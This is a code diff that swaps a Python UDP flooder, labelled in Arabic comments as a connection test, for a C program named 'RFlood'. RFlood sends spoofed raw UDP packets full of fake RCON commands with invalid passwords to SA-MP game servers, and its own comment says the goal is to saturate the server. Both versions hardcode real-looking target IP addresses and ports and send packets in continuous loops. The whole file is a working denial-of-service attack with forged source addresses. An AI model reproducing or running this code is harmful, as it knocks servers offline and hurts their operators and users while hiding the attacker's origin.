@@ -1,32 +1,222 @@
-import socket
-import time
+/*
+RFlood envía paquetes UDP con el payload similar a los de los comandos RCON.
+Se utilizan contraseñas inválidas para enviar comandos reales, así hasta que el servidor se satura.
+Solo funciona en servidores con la rcon password activada.
+*/
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#include <unistd.h>
+ 
+#define MAXSIZECMD 50
+#define LEN 512
+#define VECTOR 22
 
-# حدد البيانات
-TARGET_IP = "193.111.250.244"  # استبدله بـ IP الهدف
-TARGET_PORT = 7057        # استبدله بمنفذ السيرفر
-DURATION = 300              # مدة الاختبار بالثواني
+typedef unsigned short u16;
+typedef unsigned long u32;
 
-def test_connection():
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    # حزمة استعلام SAMP بسيطة (Info Query)
-    payload = b'SAMP' + socket.inet_aton(TARGET_IP)[:900] + int(TARGET_PORT).to_bytes(2, 'little') + b'i'
-    
-    end_time = time.time() + DURATION
-    count = 0
-    
-    print(f"جاري اختبار الاتصال مع {TARGET_IP}:{TARGET_PORT}...")
-    
-    try:
-        while time.time() < end_time:
-            client.sendto(payload, (TARGET_IP, TARGET_PORT))
-            count += 1
-    except Exception as e:
-        print(f"حدث خطأ: {e}")
-    finally:
-        client.close()
-        print(f"تم إرسال {count} حزمة استعلام.")
+char comandos[15][16] = {"cmdlist", "varlist", "exit", "echo", "hostname", "gamemodetext", "mapname", "kick", "ban", "rcon_password", "players", "say", "gmx", "loadfs", "language"};
+char abc[] = "abcdefghijklmnopqrstuvwxyz0123456789.";
 
-if __name__ == "__main__":
-    test_connection()
-    
+unsigned short csum (unsigned short *buf, int nwords);
+uint16_t udp_checksum(const struct iphdr  *ip,
+        const struct udphdr *udp,
+        const uint16_t *buf);
+ 
+unsigned char ip[4];
+
+void makeArrayIP(char* inIP, char *outIP){
+    short i, nTemp = 0; char cbool = 0;
+    for(i = 0; inIP[i] != '\0'; i++){
+        if(inIP[i] != '.'){
+            nTemp = nTemp * 10 + (short)(inIP[i] - '0');
+        }else{
+            outIP[cbool] = (char) nTemp;
+            nTemp = 0;
+            cbool++;
+        }
+    }
+    outIP[cbool] = (char) nTemp;
+}
+
+int main(int argc, char * argv[])
+{
+    // ==========================================
+    // ضع عنوان الـ IP والمنفذ المستهدف هنا مباشرة
+    // ==========================================
+    char * TARGET_IP = "94.23.168.153";  // استبدل هذا بالـ IP المستهدف
+    int TARGET_PORT = 2343;          // استبدل هذا برقم البورت المستهدف
+
+    srand(time(NULL));
+
+    char packet_dup[4];  
+    makeArrayIP(TARGET_IP, &ip[0]);  
+    packet_dup[0] = ip[0];
+    packet_dup[1] = ip[1];
+    packet_dup[2] = ip[2];
+    packet_dup[3] = ip[3];
+   
+    while(1)
+    {
+        int iprang[4];
+        iprang[0] = 186;
+        iprang[1] = 181;
+        iprang[2] = 201;
+        iprang[3] = 190;
+        char ip_d[20];
+        sprintf(ip_d, "%d.%d.%d.%d", iprang[rand() % 3], rand() % 250, rand() % 252, rand() % 208);
+        int s_port = 1024 + (rand() % 48422);
+        int PSOURCE = s_port;
+        int PDEST = TARGET_PORT;
+        char * SOURCE = ip_d;
+        char * DEST = TARGET_IP;
+        int s;
+        struct sockaddr_in daddr, saddr;
+        char packet[LEN];
+
+        // ============= RCON ==============//
+        char rpaswd[6 + rand() % 6];
+        for(int i = 0; i != sizeof(rpaswd); i++) rpaswd[i] = abc[rand() % 38];
+        int sizepaswd = sizeof(rpaswd);
+        int ncmd = (rand() % 9);
+        char cmdstring[MAXSIZECMD];
+        sprintf(cmdstring, "%s ", comandos[ncmd]);
+        int scmd = strlen(comandos[ncmd]) + 1;
+        int sizerand = 4 + sizepaswd + scmd + 3 + (rand() % 20);
+        for(int i = scmd; i != sizerand; i++) cmdstring[i] = abc[rand() % 38];
+
+        struct iphdr *ip_header = (struct iphdr *)packet;  
+        struct udphdr *udp = (struct udphdr *)((void *) ip_header + sizeof(struct iphdr));
+ 
+        if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
+            perror("error:");
+            exit(EXIT_FAILURE);
+        }
+ 
+        daddr.sin_family = AF_INET;
+        saddr.sin_family = AF_INET;
+        daddr.sin_port = htons(PDEST);
+        saddr.sin_port = htons(PSOURCE);
+        inet_pton(AF_INET, DEST, (struct in_addr *)&daddr.sin_addr.s_addr);
+        inet_pton(AF_INET, SOURCE, (struct in_addr *)&saddr.sin_addr.s_addr);
+ 
+        memset(daddr.sin_zero, 0, sizeof(daddr.sin_zero));
+        memset(saddr.sin_zero, 0, sizeof(saddr.sin_zero));
+        memset(udp, 0, sizeof(struct udphdr));
+        memset(ip_header, 0, sizeof(struct iphdr));
+ 
+        ip_header->ihl = 5;
+        ip_header->version = 4;
+        ip_header->tos = 0x0;
+        ip_header->id = rand();
+        ip_header->frag_off = 0;  
+        ip_header->ttl = 90 + rand() % 40;          
+        ip_header->protocol = 17;  
+        ip_header->check = 0;          
+        ip_header->saddr = saddr.sin_addr.s_addr;
+        ip_header->daddr = daddr.sin_addr.s_addr;
+ 
+        udp->source = htons(PSOURCE);
+        udp->dest = htons(PDEST);
+ 
+        char incoming[11];
+        int sizedata = sizeof(incoming) + sizerand;
+       
+        register char * packet_pos = ((void *) udp) + sizeof(struct udphdr);
+       
+        memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata);
+        packet_pos[11] = (char)(sizepaswd & 0xFFFF);
+        packet_pos[12] = (char)(sizepaswd >> 8 & 0xFFFF);
+        int xd = 0, xf = 0;
+        for(int i = 13; xd != sizepaswd; i++)
+        {
+            packet_pos[i] = rpaswd[xd]; 
+            xd++;
+        }
+        packet_pos[xd] = (char)(sizerand & 0xFFFF);
+        xd++;
+        packet_pos[xd] = (char)(sizerand >> 8 & 0xFFFF);
+        for(int i = 13 + xd; xf != sizerand; i++){
+            packet_pos[i] = cmdstring[xf];
+            xf++;
+        }
+        packet_pos[0] = 0x53;  
+        packet_pos[1] = 0x41;
+        packet_pos[2] = 0x4D;
+        packet_pos[3] = 0x50;  
+        packet_pos[4] = packet_dup[0];
+        packet_pos[5] = packet_dup[1];
+        packet_pos[6] = packet_dup[2];
+        packet_pos[7] = packet_dup[3];
+        packet_pos[8] = (char)(PDEST & 0xFFFF);
+        packet_pos[9] = (char)(PDEST >> 8 & 0xFFFF);
+        packet_pos[10] = 0x78; 
+        
+        memcpy(((void *) udp) + sizeof(struct udphdr), (char*)packet_pos, sizedata);
+       
+        int sizeudpdata = sizeof(struct udphdr) + sizedata;
+        ip_header->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    
+        udp->len = htons(sizeudpdata);
+        int optval = 1;
+        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int)) < 0)
+            perror("IP HDRINCL");
+            
+        int sizepacket = sizeof(struct iphdr) + sizeudpdata;
+        udp->check = 0;
+        udp->check = udp_checksum(ip_header, udp, (const uint16_t *)udp);
+        
+        sendto(s, (char *)packet, sizepacket, 0, (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));     
+        close(s);
+        usleep(1);        
+    }
+    exit(EXIT_SUCCESS);
+}
+ 
+struct pseudo_hdr {
+    u_int32_t source;
+    u_int32_t dest;
+    u_int8_t zero; 
+    u_int8_t protocol;
+    u_int16_t udp_length;
+};
+ 
+uint16_t udp_checksum(const struct iphdr  *ip_header,
+        const struct udphdr *udp,
+        const uint16_t *buf)
+{
+    int calculated_length = ntohs(udp->len)%2 == 0 ? ntohs(udp->len) : ntohs(udp->len) + 1;
+ 
+    struct pseudo_hdr ps_hdr = {0};
+    bzero(&ps_hdr, sizeof(struct pseudo_hdr));
+    uint8_t data[sizeof(struct pseudo_hdr) + calculated_length];
+    bzero(data, sizeof(struct pseudo_hdr) + calculated_length);
+ 
+    ps_hdr.source = ip_header->saddr;
+    ps_hdr.dest = ip_header->daddr;
+    ps_hdr.protocol = IPPROTO_UDP; 
+    ps_hdr.udp_length = udp->len;
+ 
+    memcpy(data, &ps_hdr, sizeof(struct pseudo_hdr));
+    memcpy(data + sizeof(struct pseudo_hdr), buf, ntohs(udp->len)); 
+ 
+    return csum((uint16_t *)data, sizeof(data)/2);
+}
+ 
+unsigned short csum (unsigned short *buf, int nwords)
+{
+    unsigned long sum;
+ 
+    for (sum = 0; nwords > 0; nwords--)
+        sum += *buf++;
+ 
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    return ~sum;
+}
